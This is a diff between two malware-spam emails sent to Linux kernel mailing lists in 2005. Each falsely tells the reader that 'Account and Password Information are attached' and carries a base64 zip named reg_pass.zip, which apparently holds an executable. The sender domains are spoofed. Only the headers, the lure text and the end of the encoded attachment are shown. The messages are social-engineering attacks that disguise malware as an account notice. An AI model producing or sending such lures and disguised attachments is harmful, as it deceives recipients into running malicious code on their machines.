@@ -1,26 +1,26 @@
-From: office@w-4.de
-Subject: Registration Confirmation
-Date: Mon, 19 Dec 2005 17:14:40 UTC
-Message-ID: <822e4b5aac.193676a5@w-4.de>
+From: office@hdi-tarifeonline.de
+Subject: Your Password
+Date: Mon, 19 Dec 2005 17:59:10 GMT
+Message-ID: <5c2b2f034.ead106@hdi-tarifeonline.de>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="====ab198634e57034.7b"
+Content-Type: multipart/mixed; boundary="bb2ffcfd.0da1526807ad"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: netdev@oss.sgi.com
+To: xfs-masters@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---====ab198634e57034.7b
+--bb2ffcfd.0da1526807ad
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.w-4.de
-***** Email: postman@w-4.de
---====ab198634e57034.7b
+***** Go to: http://www.hdi-tarifeonline.de
+***** Email: postman@hdi-tarifeonline.de
+--bb2ffcfd.0da1526807ad
 Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---====ab198634e57034.7b--
+--bb2ffcfd.0da1526807ad--
